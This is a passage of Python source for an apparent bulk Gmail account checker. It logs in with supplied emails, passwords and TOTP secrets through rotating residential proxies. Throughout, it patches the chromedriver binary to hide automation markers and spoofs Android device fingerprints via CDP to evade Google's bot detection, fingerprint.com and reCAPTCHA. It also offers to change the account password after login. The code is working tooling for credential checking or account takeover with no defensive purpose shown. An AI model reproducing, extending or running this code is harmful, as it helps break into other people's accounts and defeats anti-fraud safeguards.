  // Now that registration is complete, delete it so fingerprint.com cannot find
  // it via Object.getOwnPropertyNames(window).
  try { delete window.__nr; } catch(e) {}
})();
"""


def get_chrome_version_main(chrome_path: str | None) -> int | None:
    """Read the installed browser major version for undetected-chromedriver."""
    configured = os.environ.get("CHROME_VERSION_MAIN")
    if configured and configured.isdigit():
        return int(configured)
    version = get_chrome_version(chrome_path)
    if version:
        return int(version.split(".", 1)[0])
    return None


def get_chrome_version(chrome_path: str | None) -> str | None:
    """Read the full installed browser version for UA/client-hint emulation."""
    configured = os.environ.get("CHROME_VERSION_FULL")
    if configured:
        return configured
    if not chrome_path:
        return None
    try:
        output = subprocess.check_output(
            [chrome_path, "--version"], encoding="utf8", stderr=subprocess.STDOUT
        )
        import re
        match = re.search(r"\b(\d+\.\d+\.\d+\.\d+)\b", output)
        return match.group(1) if match else None
    except Exception:
        return None


def requests_proxy_url(proxy_url: str) -> str:
    """Proxy URL safe for requests/urllib3.

    A raw '+' in the username is a space to urllib3, so ProxyScrape session
    names that contain '+' get rejected. Percent-encode user and password.
    """
    from urllib.parse import urlparse, quote
    parsed = urlparse(proxy_url)
    host = parsed.hostname or ""
    port = parsed.port or 80
    user = quote(parsed.username or "", safe="")
    password = quote(parsed.password or "", safe="")
    if user:
        return f"http://{user}:{password}@{host}:{port}"
    return f"http://{host}:{port}"


def parse_proxy(proxy_url: str) -> dict | None:
    try:
        from urllib.parse import urlparse
        p = urlparse(proxy_url)
        return {
            "scheme": p.scheme or "http",
            "host": p.hostname,
            "port": p.port or 3128,
            "username": p.username,
            "password": p.password,
        }
    except Exception:
        return None


class _LocalProxyHandler(socketserver.BaseRequestHandler):
    """Authenticating TCP forwarder — injects Proxy-Authorization for every request.

    Replaces the MV2 Chrome extension approach.  Chrome for Testing 151 crashes
    when an MV2 extension is loaded under Xvfb; a plain TCP proxy has no such
    restriction and is indistinguishable from a real residential proxy endpoint.
    """

    def handle(self):
        client = self.request
        client.settimeout(30)
        srv = self.server  # type: ignore[attr-defined]
        uh, up, auth = srv.upstream_host, srv.upstream_port, srv.auth_b64
        try:
            data = b""
            while b"\r\n\r\n" not in data and len(data) < 128 * 1024:
                chunk = client.recv(8192)
                if not chunk:
                    break
                data += chunk
            if not data:
                return
            head, _, rest = data.partition(b"\r\n\r\n")
            lines = head.split(b"\r\n")
            first = lines[0].decode("latin1")
            parts = first.split(" ", 2)
            if len(parts) != 3:
                return
            method, target, version = parts
            headers = []
            for line in lines[1:]:
                if b":" in line:
                    k, v = line.split(b":", 1)
                    headers.append((k.decode("latin1"), v.decode("latin1").lstrip()))
            auth_hdr = f"Proxy-Authorization: Basic {auth}"
            if method.upper() == "CONNECT":
                remote = socket.create_connection((uh, up), timeout=20)
                remote.sendall(
                    f"CONNECT {target} {version}\r\nHost: {target}\r\n"
                    f"{auth_hdr}\r\nProxy-Connection: Keep-Alive\r\n\r\n".encode()
                )
                resp = b""
                while b"\r\n\r\n" not in resp and len(resp) < 4096:
                    chunk = remote.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                client.sendall(resp)
                if not (resp.startswith(b"HTTP/1.1 200") or resp.startswith(b"HTTP/1.0 200")):
                    remote.close()
                    return
            else:
                remote = socket.create_connection((uh, up), timeout=20)
                out = [first.encode("latin1")]
                has_auth = False
                for hk, hv in headers:
                    if hk.lower() == "proxy-authorization":
                        has_auth = True
                        out.append(auth_hdr.encode("latin1"))
                    else:
                        out.append(f"{hk}: {hv}".encode("latin1"))
                if not has_auth:
                    out.append(auth_hdr.encode("latin1"))
                remote.sendall(b"\r\n".join(out) + b"\r\n\r\n" + rest)
            # Bidirectional relay
            sockets = [client, remote]
            while True:
                r, _, ex = _select.select(sockets, [], sockets, 30)
                if ex:
                    break
                if not r:
                    continue
                for s in r:
                    d = s.recv(65536)
                    if not d:
                        return
                    (remote if s is client else client).sendall(d)
        except Exception:
            pass


class _ThreadedLocalProxy(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


def _start_local_proxy(host: str, port: int, username: str, password: str):
    """Start a local authenticating TCP forwarder. Returns (server, local_port)."""
    server = _ThreadedLocalProxy(("127.0.0.1", 0), _LocalProxyHandler)
    server.upstream_host = host  # type: ignore[attr-defined]
    server.upstream_port = port  # type: ignore[attr-defined]
    server.auth_b64 = base64.b64encode(f"{username}:{password}".encode()).decode()  # type: ignore[attr-defined]
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server, server.server_address[1]


def make_proxy_extension(host: str, port: int, username: str, password: str) -> str:
    """
    Build a Manifest-V2 Chrome extension zip that handles proxy auth.
    Returns the path to the zip file (caller must delete it).
    NOTE: No longer used — Chrome 151 crashes when MV2 extensions are loaded
    under Xvfb. Kept for reference. Use _start_local_proxy() instead.
    """
    manifest = json.dumps({
        "version": "1.0.0",
        "manifest_version": 2,
        "name": "Proxy Auth",
        "permissions": [
            "proxy", "tabs", "unlimitedStorage", "storage",
            "<all_urls>", "webRequest", "webRequestBlocking"
        ],
        "background": {"scripts": ["background.js"]},
        "minimum_chrome_version": "22.0.0"
    })
    background_js = f"""
var config = {{
    mode: "fixed_servers",
    rules: {{
        singleProxy: {{ scheme: "http", host: {json.dumps(host)}, port: parseInt("{port}") }},
        bypassList: ["localhost"]
    }}
}};
chrome.proxy.settings.set({{value: config, scope: "regular"}}, function() {{}});
function callbackFn(details) {{
    return {{ authCredentials: {{ username: {json.dumps(username)}, password: {json.dumps(password)} }} }};
}}
chrome.webRequest.onAuthRequired.addListener(callbackFn, {{urls: ["<all_urls>"]}}, ["blocking"]);
"""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("manifest.json", manifest)
        z.writestr("background.js", background_js)
    buf.seek(0)

    fd, path = tempfile.mkstemp(suffix=".zip", prefix="vanguard_proxy_")
    os.close(fd)
    with open(path, "wb") as f:
        f.write(buf.read())
    return path


def generate_totp(secret: str) -> str | None:
    try:
        import pyotp
        # Strip spaces and uppercase (Google Authenticator shows keys with spaces)
        clean = secret.replace(" ", "").replace("\t", "").upper()
        return pyotp.TOTP(clean).now()
    except Exception as e:
        log(f"TOTP error: {e}")
        return None


def ensure_xvfb() -> str | None:
    """Start Xvfb on :99 if DISPLAY is not set. Returns display string or None."""
    display = os.environ.get("DISPLAY")
    if display:
        return display
    try:
        # Kill any stale Xvfb first
        subprocess.run(["pkill", "-f", "Xvfb :99"], capture_output=True)
        time.sleep(0.3)
        subprocess.Popen(
            ["Xvfb", ":99", "-screen", "0", "1366x768x24", "-ac"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(1.0)
        os.environ["DISPLAY"] = ":99"
        log("Xvfb started on :99")
        return ":99"
    except Exception as e:
        log(f"Xvfb unavailable: {e}")
        return None


# ── Main entry ────────────────────────────────────────────────────────────────

def main():
    try:
        raw = sys.stdin.read()
        data = json.loads(raw)
    except Exception as e:
        print(json.dumps({"status": "unknown", "reason": f"Bad input JSON: {e}", "totpCode": None}), flush=True)
        return

    email             = data.get("email", "")
    password          = data.get("password", "")
    totp_secret       = data.get("totp")
    proxy             = data.get("proxy")
    proxy_for_ip_check = data.get("proxyForIpCheck") or proxy  # original URL without sticky suffix
    fresh_profile     = bool(data.get("freshProfile", False))
    change_password   = bool(data.get("changePasswordAfterLogin", False))
    raw_device_index  = data.get("deviceIndex")
    device_index      = (
        int(raw_device_index)
        if isinstance(raw_device_index, int) and 0 <= raw_device_index < len(PHONE_PROFILES)
        else None
    )

    _t0 = time.time()
    result = check_gmail(
        email, password, totp_secret, proxy, fresh_profile,
        proxy_for_ip_check, device_index, change_password,
    )

    # Auto-retry up to 3 times if Google blocked automation detection.
    # CRITICAL: each retry MUST use a NEW sticky session ID → different proxy IP.
    # Retrying with the same IP always fails again (IP is already flagged).
    import re as _re
    def _new_session_proxy(proxy_url: str | None) -> str | None:
        """Swap the username's sticky session, keeping country and state.

        A saved URL may already end in -session-<id>, and a retry must not
        stack a second token onto it.
        """
        if not proxy_url or "@" not in proxy_url:
            return proxy_url
        new_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
        matched = _re.match(r'^(https?://)([^:@]+)(.*)$', proxy_url)
        if not matched:
            return proxy_url
        scheme, user, rest = matched.group(1), matched.group(2), matched.group(3)
        user = _re.sub(r'(?:-session-[A-Za-z0-9]+)+$', '', user)
        return f"{scheme}{user}-session-{new_id}{rest}"

    _blocked_reason = result.get("reason", "")

    def _is_retriable(res: dict) -> bool:
        """Retry only a crashed Chrome. Google's 'browser may not be secure'
        page does not change on a second launch, so repeating it only delays
        the result."""
        st  = res.get("status", "")
        rsn = res.get("reason", "").lower()
        if st == "unknown" and any(x in rsn for x in [
            "chrome launch failed", "oom", "signal", "killed",
            "failed to spawn", "exit code", "timed out", "chrome crash",
        ]):
            return True
        return False

    for _retry_n in range(3):
        if not _is_retriable(result):
            break
        _retry_proxy = _new_session_proxy(proxy)
        log(f"{email} — retriable result ({result.get('status')}) on attempt {_retry_n+1}/3, retrying with fresh profile + new proxy IP…")
        result = check_gmail(
            email, password, totp_secret, _retry_proxy, True,
            proxy_for_ip_check, device_index, change_password,
        )
        _blocked_reason = result.get("reason", "")

    result["category"] = browser_result_category(result)
    result["durationMs"] = int((time.time() - _t0) * 1000)
    log(f"{email} — Total duration: {result['durationMs']}ms ({result['durationMs']//1000}s)")
    print(json.dumps(result), flush=True)


# ── Browser check ─────────────────────────────────────────────────────────────

def _ensure_chromedriver_patched(version_main: int | None = None) -> None:
    """Ensure chromedriver is clean of cdc_ strings and carries the UC sentinel.

    ROOT CAUSE (why previous attempts failed):
      patcher.auto() always calls os.unlink() then re-downloads — this wiped
      our cdc_ patch every single time, including the implicit call inside
      uc.Chrome(). Chrome therefore always launched with the unpatched binary.
      The earlier workaround of appending b"undetected chromedriver" to the ELF
      binary was also wrong: CDC_OLD is 27 bytes but CDC_NEW was sliced to 28,
      adding +1 byte per replacement (×11 = +11 bytes), corrupting the ELF
      structure and causing SIGSEGV on every Chrome launch.

    THIS FIX — three-part approach:
      1. MONKEY-PATCH Patcher.auto() once at import time to check
         is_binary_patched() BEFORE calling os.unlink(). Once we embed the
         sentinel (step 3 below), every subsequent auto() call — including
         the one inside uc.Chrome() — returns True immediately, no re-download.
      2. SAME-SIZE cdc_ replacement: CDC_OLD/CDC_NEW are both exactly 27 bytes.
         Binary size is unchanged → ELF structure stays valid → no SIGSEGV.
      3. SAME-SIZE sentinel embedding: overwrite the first 23-byte null run
         found in the binary with b"undetected chromedriver". No bytes added,
         no bytes removed — ELF loader cannot tell the file changed.

    Uses a local Random instance so global random state is unaffected."""
    import string as _string
    import random as _random_mod
    import undetected_chromedriver as _uc

    # CDC_OLD is 27 bytes (verified: len(b'cdc_adoQpoasnfa76pfcZLmcfl_') == 27)
    CDC_OLD   = b'cdc_adoQpoasnfa76pfcZLmcfl_'           # 27 bytes
    UC_MARKER = b'undetected chromedriver'                 # 23 bytes
    _rng = _random_mod.Random(77331)
    # k=23 → 'rvx_' (4) + 23 chars = 27 bytes, exactly matching CDC_OLD length
    CDC_NEW = ('rvx_' + ''.join(_rng.choices(_string.ascii_lowercase + _string.digits, k=23))).encode()
    assert len(CDC_NEW) == len(CDC_OLD), (
        f'[patch] BUG: replacement is {len(CDC_NEW)} bytes, original is {len(CDC_OLD)} — must match'
    )

    # ── 1. Monkey-patch Patcher.auto() to prevent re-download ────────────────
    # Applied once (guarded by class attribute) so multiple check_gmail() calls
    # in the same process don't stack patches.
    _GUARD = '_vmx_patched'
    if not getattr(_uc.Patcher, _GUARD, False):
        _orig_auto = _uc.Patcher.auto
        def _safe_auto(self_p, *args, **kwargs):
            """If the binary already has the UC sentinel, skip auto() entirely.
            This prevents the os.unlink()+re-download that would wipe our patch."""
            if self_p.is_binary_patched():
                return True
            return _orig_auto(self_p, *args, **kwargs)
        _uc.Patcher.auto = _safe_auto
        setattr(_uc.Patcher, _GUARD, True)
        log('[patch] Patcher.auto() override active — re-download prevention ON')

    # ── 2. Ensure binary exists ───────────────────────────────────────────────
    uc_dir = os.path.expanduser('~/.local/share/undetected_chromedriver/')
    os.makedirs(uc_dir, exist_ok=True)
    binary_path = os.path.join(uc_dir, 'undetected_chromedriver')
    stamp_path = os.path.join(uc_dir, 'chrome_major')
    wanted_major = str(version_main or "")
    stamped_major = ""
    if os.path.exists(stamp_path):
        try:
            stamped_major = open(stamp_path, encoding="utf8").read().strip()
        except Exception:
            stamped_major = ""
    # A patched 149 driver must not be reused against Chrome 156 — Google
    # never even opens, and ChromeDriver refuses the session.
    if binary_path and os.path.exists(binary_path) and wanted_major and stamped_major != wanted_major:
        log(f"[patch] chromedriver is for Chrome {stamped_major or '?'} — need {wanted_major}, re-downloading")
        try:
            os.remove(binary_path)
        except OSError as _rm_err:
            log(f"[patch] could not remove old chromedriver: {_rm_err}")

    if not os.path.exists(binary_path):
        log('[patch] chromedriver binary missing — downloading via UC patcher...')
        try:
            # _safe_auto falls through to _orig_auto (is_binary_patched()=False
            # because file is missing), which downloads and extracts the binary.
            patcher = _uc.Patcher(version_main=version_main)
            patcher.auto()
        except Exception as e:
            raise RuntimeError(f'[patch] Download failed: {e}') from e
        if not os.path.exists(binary_path):
            raise RuntimeError('[patch] Binary still missing after download')
        log('[patch] chromedriver downloaded')

    # ── 3. Read, patch, write ─────────────────────────────────────────────────
    with open(binary_path, 'rb') as fh:
        content = fh.read()
    original_size = len(content)
    modified = False

    # 3a. Replace cdc_ strings — 27→27 bytes, binary size unchanged
    if CDC_OLD in content:
        count = content.count(CDC_OLD)
        content = content.replace(CDC_OLD, CDC_NEW)
        remaining = content.count(CDC_OLD)
        if remaining:
            raise RuntimeError(f'[patch] cdc_ patch incomplete: {remaining} left')
        log(f'[patch] Patched {count} cdc_ refs in undetected_chromedriver')
        modified = True
    else:
        log('[patch] undetected_chromedriver cdc_ already clean')

    # 3b. Embed UC sentinel by overwriting the first null run of ≥23 bytes.
    #     SAME-SIZE operation: no bytes added, ELF structure stays intact.
    #     is_binary_patched() → True → _safe_auto() returns True → uc.Chrome()
    #     internal patcher never calls os.unlink()+re-download.
    if UC_MARKER not in content:
        null_run = b'\x00' * len(UC_MARKER)
        pos = content.find(null_run)
        if pos != -1:
            content = content[:pos] + UC_MARKER + content[pos + len(UC_MARKER):]
            log(f'[patch] UC sentinel embedded at offset {pos} (null overwrite, same size)')
            modified = True
        else:
            # 21 MB binary with no 23-byte null run is extremely unlikely but guard it.
            log('[patch] WARNING: no null run found for UC sentinel — re-download protection may be incomplete')

    # Sanity check: write must preserve binary size exactly
    if modified:
        assert len(content) == original_size, (
            f'[patch] BUG: binary size changed {original_size} → {len(content)} — aborting write'
        )
        try:
            with open(binary_path, 'wb') as fh:
                fh.write(content)
            os.chmod(binary_path, 0o755)
        except OSError as _e:
            if _e.errno == 26:  # ETXTBSY — binary currently executing (another Chrome running)
                log('[patch] Binary busy (ETXTBSY) — skipping write; already patched by prior run')
            else:
                raise
    if wanted_major and os.path.exists(binary_path):
        try:
            with open(stamp_path, "w", encoding="utf8") as _stamp:
                _stamp.write(wanted_major)
        except Exception as _stamp_err:
            log(f"[patch] chrome major stamp skipped: {_stamp_err}")


def check_gmail(
    email: str,
    password: str,
    totp_secret: str | None,
    proxy: str | None,
    fresh_profile: bool = False,
    proxy_for_ip_check: str | None = None,
    device_index: int | None = None,
    change_password_after_login: bool = False,
) -> dict:
    totp_code = generate_totp(totp_secret) if totp_secret else None

    try:
        import undetected_chromedriver as uc
    except ImportError:
        return {
            "status": "unknown",
            "reason": "undetected-chromedriver not installed. Run: pip install -r requirements.txt",
            "totpCode": totp_code,
        }

    display = ensure_xvfb()
    headless = display is None
    chromium_path = get_chromium_path()
    chrome_version_main = get_chrome_version_main(chromium_path)
    chrome_version_full = get_chrome_version(chromium_path)
    log(
        f"Chrome: {chromium_path}, version_main={chrome_version_main}, "
        f"headless={headless}, display={display}"
    )

    # Ensure chromedriver binary exists, is free of cdc_ detection strings, and
    # has the UC is_binary_patched() sentinel so uc.Chrome()'s internal patcher
    # skips re-downloading (via the Patcher.auto() monkey-patch applied inside).
    _ensure_chromedriver_patched(version_main=chrome_version_main)

    # Profile directory — wiped on fresh_profile=True so Google sees a brand-new device
    safe_email = email.replace("@", "_at_").replace(".", "_")
    profile_dir = os.path.join(tempfile.gettempdir(), "gmail_checker_profiles", safe_email)

    if fresh_profile and os.path.exists(profile_dir):
        import shutil
        try:
            shutil.rmtree(profile_dir)
            log(f"Fresh profile mode — wiped {profile_dir}")
        except Exception as e:
            log(f"Warning: could not wipe profile dir: {e}")

    os.makedirs(profile_dir, exist_ok=True)

    log(f"Chrome profile: {profile_dir} (fresh={fresh_profile})")

    # ── Load or generate unique fingerprint (fresh_profile → always new) ──────
    fp = get_or_create_fingerprint(
        profile_dir,
        proxy=proxy,
        device_index=device_index,
        reuse_device_snapshot=not fresh_profile,
    )
    if chrome_version_full:
        # Keep the emulated Android UA/client hints aligned with the actual
        # Chrome binary used by undetected-chromedriver.
        fp["chromeVersion"] = chrome_version_full
    fp_summary = (f"{fp['model']} | {fp['webglRenderer']} | "
                  f"{fp['screenW']}x{fp['screenH']} dpr={fp['dpr']} | canvas={fp['canvasSeed']}")
    geo_info = (f"tz={fp.get('timezone','?')} lang={fp.get('language','?')} "
                f"cc={fp.get('countryCode','?')} geoLocked={fp.get('geoLocked', False)}")
    log(f"Fingerprint: {fp_summary}")
    log(f"Geo fingerprint: {geo_info}")
    MOBILE_UA = (
        f"Mozilla/5.0 (Linux; Android {fp['androidVersion']}; {fp['model']}) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{fp['chromeVersion']} Mobile Safari/537.36"
    )

    options = uc.ChromeOptions()
    options.add_argument(f"--user-data-dir={profile_dir}")
    # TCP forwarder replaces MV2 extension — Chrome for Testing 151 crashes when
    # an MV2 extension is loaded under Xvfb.  A local socketserver proxy has no
    # such restriction and authenticates every request to the upstream proxy.
    _local_proxy_server = None

    # Proxy configuration
    if proxy:
        proxy_info = parse_proxy(proxy)
        if proxy_info and proxy_info["host"]:
            log(f"Proxy: {proxy_info['host']}:{proxy_info['port']} user={proxy_info.get('username')}")
            if proxy_info.get("username"):
                _local_proxy_server, _local_proxy_port = _start_local_proxy(
                    proxy_info["host"], proxy_info["port"],
                    proxy_info["username"], proxy_info.get("password") or ""
                )
                options.add_argument(f"--proxy-server=http://127.0.0.1:{_local_proxy_port}")
                log(f"Local authenticated proxy on 127.0.0.1:{_local_proxy_port} (Chrome 151 MV2 crash fix)")
            else:
                options.add_argument(
                    f'--proxy-server=http://{proxy_info["host"]}:{proxy_info["port"]}'
                )

    # Exit IP will be fetched from inside Chrome after launch (uses the same proxy Chrome uses).
    exit_ip: str | None = None

    # Chrome flags — use fingerprint dimensions/UA
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-setuid-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument(f"--window-size={fp['screenW']},{fp['screenH']}")
    options.add_argument(f"--lang={fp['language']},en;q=0.9")
    options.add_argument("--disable-save-password-bubble")
    options.add_argument("--password-store=basic")
    options.add_argument("--no-first-run")
    options.add_argument("--no-default-browser-check")
    options.add_argument("--disable-blink-features=AutomationControlled")
    # NOTE: --disable-features=ChromeWhatsNewUI,... intentionally removed —
    # Chrome 151 exits its renderer under Xvfb when this legacy feature bundle is
    # passed (same finding as device_check.py). Omitting it fixes the immediate
    # "invalid session id" crash after launch.
    options.add_argument("--disable-sync")
    options.add_argument("--no-pings")
    # Do not pass the usual Selenium flag bundle (--disable-component-update,
    # --disable-default-apps, --disable-background-networking, etc.). Google's
    # sign-in page treats that set as an insecure/automated browser.
    options.add_argument(f"--user-agent={MOBILE_UA}")
    options.add_argument("--touch-events=enabled")
    # DPR comes from Emulation.setDeviceMetricsOverride only. Combining it with
    # --force-device-scale-factor double-scales innerWidth vs outerWidth, which
    # fingerprint.com scores as Developer Tools + Tampering.
    # Chrome 151 removed Emulation.setDeviceMemoryOverride CDP command.
    # Use the Chrome flag instead so navigator.deviceMemory reports the correct
    # spoofed value (instead of undefined which is a strong automation signal).
    options.add_argument(f"--force-device-memory={fp['deviceMemory']}")
    # VM detection fix: SwiftShader renders via GPU-like pipeline instead of --disable-gpu
    # which exposes software rendering signals. These flags make WebGL work and match
    # what real Android Chrome reports (device_check.py uses the same set).
    # Chrome 151+: --use-gl=swiftshader maps to gl=none,angle=none which is no longer
    # an allowed implementation. Use --use-angle=swiftshader (gl=egl-angle,angle=swiftshader)
    # which is the correct ANGLE-backed software renderer in Chrome 115+.
    options.add_argument("--use-angle=swiftshader")
    options.add_argument("--enable-webgl")
    options.add_argument("--ignore-gpu-blocklist")
    options.add_argument("--disable-gpu-sandbox")
    # Disable GPU-backed page compositing — the source of renderer crashes under Xvfb.
    # Keeps the GPU process alive (so WebGL works) but offloads compositing to software.
    # Mirrors device_check.py which uses this same flag for Chrome 151 Xvfb stability.
    options.add_argument("--disable-gpu-compositing")
    # Chrome 151 renderer stability fix (from device_check.py)
    options.add_argument("--disable-extensions-http-throttling")

    log(f"Launching Chrome (UC)…")

    # ── Start private Xvfb display OUTSIDE the Chrome lock ─────────────────
    # A separate short-lived display-allocation lock ensures no two accounts
    # pick the same Xvfb display number.  The 0.5s Xvfb startup wait happens
    # OUTSIDE the Chrome lock, so all accounts can initialise their displays
    # in parallel rather than one at a time.
    _DISPLAY_ALLOC_LOCK = "/tmp/gmail_checker_display_alloc.lock"
    _xvfb_proc = None
    _disp_num = 99
    _disp_lock_fd = open(_DISPLAY_ALLOC_LOCK, "w")
    try:
        fcntl.flock(_disp_lock_fd, fcntl.LOCK_EX)
        _cleanup_stale_chrome_artifacts(profile_dir)  # kills orphaned Xvfb, removes stale locks/singletons
        _disp_num = _find_free_display()
        try:
            _xvfb_proc = subprocess.Popen(
                ["Xvfb", f":{_disp_num}", "-screen", "0", "1440x1024x24", "-ac"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
            os.environ["DISPLAY"] = f":{_disp_num}"
            log(f"Private Xvfb on :{_disp_num} (pid={_xvfb_proc.pid})")
        except Exception as _xvfb_err:
            log(f"Private Xvfb failed (:{_disp_num}): {_xvfb_err} — using shared display")
            _xvfb_proc = None
    finally:
        fcntl.flock(_disp_lock_fd, fcntl.LOCK_UN)
        _disp_lock_fd.close()
    time.sleep(0.5)  # Xvfb startup wait — runs in parallel while other accounts wait for Chrome lock

    # ── Step B.5: Chrome session slot — held for ENTIRE login session ────────
    # Prevents OOM kill: only ONE full Chrome instance runs at a time.
    # Other concurrent accounts queue here and start after current one finishes.
    _session_lock_fd = open(_CHROME_SESSION_LOCK_PATH, "w")
    log("Waiting for Chrome session slot (OOM guard)…")
    fcntl.flock(_session_lock_fd, fcntl.LOCK_EX)
    log("Chrome session slot acquired")

    # ── Step C: Chrome launch lock — now only covers the fast Chrome start ──
    # With chromedriver pre-patched and Xvfb already running, this lock holds
    # for only ~2-4s (Chrome process start + brief CDP settle) instead of ~13s.
    _lock_fd = open(_CHROME_LAUNCH_LOCK_PATH, "w")
    log("Waiting for Chrome launch slot…")
    fcntl.flock(_lock_fd, fcntl.LOCK_EX)
    log("Chrome launch slot acquired — starting Chrome")
    _cd_port = _find_free_port()
    log(f"ChromeDriver port: {_cd_port}")
    try:
        # Patcher.auto() is monkey-patched inside _ensure_chromedriver_patched()
        # to check is_binary_patched() first — so uc.Chrome()'s internal auto()
        # call returns True immediately (no os.unlink() + re-download).
        driver = uc.Chrome(
            options=options,
            browser_executable_path=chromium_path,
            headless=headless,
            version_main=chrome_version_main,
            use_subprocess=True,
            port=_cd_port,
        )
        # Expose driver + xvfb to the SIGTERM handler so they're cleaned up on pause/cancel.
        global _active_driver, _active_xvfb, _active_locks
        _active_driver = driver
        _active_xvfb   = _xvfb_proc
        _active_locks  = [_session_lock_fd]
        # Reduced from 2.5s → 1.0s: Chrome process is already running, just
        # letting CDP settle.  Lock is released sooner so next account can start.
        time.sleep(1.0)
    except Exception as e:
        fcntl.flock(_lock_fd, fcntl.LOCK_UN)
        _lock_fd.close()
        try:
            fcntl.flock(_session_lock_fd, fcntl.LOCK_UN)
            _session_lock_fd.close()
        except Exception:
            pass
        _cleanup(None, _xvfb_proc)
        if _local_proxy_server is not None:
            try:
                _local_proxy_server.shutdown()
            except Exception:
                pass
        return {
            "status": "unknown",
            "reason": f"Chrome launch failed: {str(e)[:300]}",
            "totpCode": totp_code,
            "exitIp": exit_ip,
            "fingerprint": fp_summary,
        }
    fcntl.flock(_lock_fd, fcntl.LOCK_UN)
    _lock_fd.close()
    log("Chrome launch slot released")

    log("Chrome launched")

    # Locale follows the IP Chrome is actually using, not the preflight request.
    # A rotating gateway can hand those two calls different exits.
    exit_ip = read_browser_exit_ip(driver)
    if exit_ip:
        lock_fingerprint_to_exit_ip(fp, exit_ip)
        apply_keyboard_layout(fp.get("keyboard") or "us", os.environ.get("DISPLAY"))
        try:
            with open(os.path.join(profile_dir, "fingerprint.json"), "w") as _locale_fp:
                json.dump(fp, _locale_fp, indent=2)
        except Exception as _locale_save_err:
            log(f"Locale fingerprint save skipped: {_locale_save_err}")
    else:
        fp["keyboard"] = keyboard_layout_for_language(fp.get("language") or "en-US")
        log("Chrome exit IP unread — keeping the preflight locale")
    if fresh_profile:
        log(
            f"FRESH_DEVICE canvas={fp.get('canvasSeed')} profile={profile_dir} "
            f"tz={fp.get('timezone')} lang={fp.get('language')} keyboard={fp.get('keyboard')}"
        )

    # Do not inject page JS here. Rewriting WebGL/console makes reCAPTCHA
    # show the image puzzle after "I'm not a robot". A phone Chrome has no
    # patched prototypes, and the checkbox just ticks. CDP emulation below
    # still sets the phone viewport, timezone, and user agent.

    # NOTE: Network.enable + Network.setUserAgentOverride intentionally removed.
    # Activating the CDP Network domain leaves a detectable trace that fingerprint.com
    # uses for its "developer tools" signal (weight 8). Emulation.setUserAgentOverride
    # (below) covers both the JS navigator.userAgent and the HTTP User-Agent header,
    # including Sec-CH-UA via userAgentMetadata, making Network.setUserAgentOverride
    # redundant. Avoid enabling any CDP domain that is not strictly necessary.

    # Set Chrome's actual timezone + locale via CDP at startup.
    # The stealth JS (line ~1116) only fakes Intl.DateTimeFormat at the JS level —
    # Chrome's underlying OS timezone stays UTC (Replit's system TZ) unless we set it here.
    # This must be called BEFORE any page navigation so every request/Date reflects the proxy's locale.
    try:
        driver.execute_cdp_cmd("Emulation.setTimezoneOverride",
                               {"timezoneId": fp.get("timezone", "America/New_York")})
        driver.execute_cdp_cmd("Emulation.setLocaleOverride",
                               {"locale": fp.get("language", "en-US")})
        log(f"CDP timezone/locale set → {fp.get('timezone', 'America/New_York')} / {fp.get('language', 'en-US')}")
    except Exception as e:
        log(f"CDP timezone/locale warning (non-fatal): {e}")

    # VM detection fix: override hardware concurrency at the CDP level so it matches
    # the JS patch. Without this CDP override, browser internals still report real
    # Replit VM thread count (16-32) which fingerprinters detect via timing attacks.
    try:
        driver.execute_cdp_cmd("Emulation.setHardwareConcurrencyOverride",
                               {"hardwareConcurrency": fp["hwConcurrency"]})
        log(f"CDP hwConcurrency set → {fp['hwConcurrency']}")
    except Exception as e:
        log(f"CDP hwConcurrency warning (non-fatal): {e}")

    # Touch BEFORE device metrics so the viewport is a phone, not a desktop
    # window with a mobile UA (Google rejects that mix as an insecure browser).
    try:
        driver.execute_cdp_cmd("Emulation.setTouchEmulationEnabled", {
            "enabled":        True,
            "maxTouchPoints": fp["maxTouchPoints"],
            "configuration":  "mobile",
        })
        log(f"CDP touch emulation set → maxTouchPoints={fp['maxTouchPoints']}")
    except Exception as e:
        log(f"CDP touch emulation warning (non-fatal): {e}")

    # Viewport height is the usable screen (availH), not the full panel height.
    # Using screenH here makes innerHeight larger than a real phone and is scored
    # as DevTools / tampering.
    _view_h = int(fp.get("availH") or fp["screenH"])
    try:
        driver.execute_cdp_cmd("Emulation.setDeviceMetricsOverride", {
            "width":             fp["screenW"],
            "height":            _view_h,
            "deviceScaleFactor": fp["dpr"],
            "mobile":            True,
            "hasTouch":          True,
            "screenWidth":       fp["screenW"],
            "screenHeight":      fp["screenH"],
        })
        log(f"CDP deviceMetrics set → {fp['screenW']}x{_view_h} dpr={fp['dpr']}")
    except Exception as e:
        log(f"CDP deviceMetrics warning (non-fatal): {e}")

    # deviceMemory override at C++ level — the JS prototype patch alone can be
    # bypassed by fingerprint.com reading the CDP-reported value directly.
    try:
        driver.execute_cdp_cmd("Emulation.setDeviceMemoryOverride",
                               {"memory": fp["deviceMemory"]})
        log(f"CDP deviceMemory set → {fp['deviceMemory']} GiB")
    except Exception as e:
        log(f"CDP deviceMemory skipped: {str(e).splitlines()[0][:160]}")

    # VM detection fix: Emulation.setUserAgentOverride sets navigator.userAgent and
    # navigator.platform at the CDP emulation layer — deeper than Network.setUserAgentOverride.
    # fingerprint.com compares the CDP-emulation-reported platform against the JS-reported
    # platform; both must agree on "Linux armv8l" to avoid a VM mismatch signal.
    # CRITICAL: Must include userAgentMetadata here too — calling Emulation.setUserAgentOverride
    # WITHOUT userAgentMetadata causes Chrome 151 to clear navigator.userAgentData.brands to [],
    # mobile to false, and platform to '' — a major Tampering signal that overrides both
    # Network.setUserAgentOverride metadata AND our JS-level Navigator.prototype.userAgentData fix.
    try:
        driver.execute_cdp_cmd("Emulation.setUserAgentOverride", {
            "userAgent":      MOBILE_UA,
            "acceptLanguage": f"{fp['language']},en;q=0.9",
            "platform":       fp["platform"],
            "userAgentMetadata": {
                "brands": [
                    {"brand": "Not(A;Brand",   "version": "8"},
                    {"brand": "Chromium",      "version": fp["chromeVersion"].split(".")[0]},
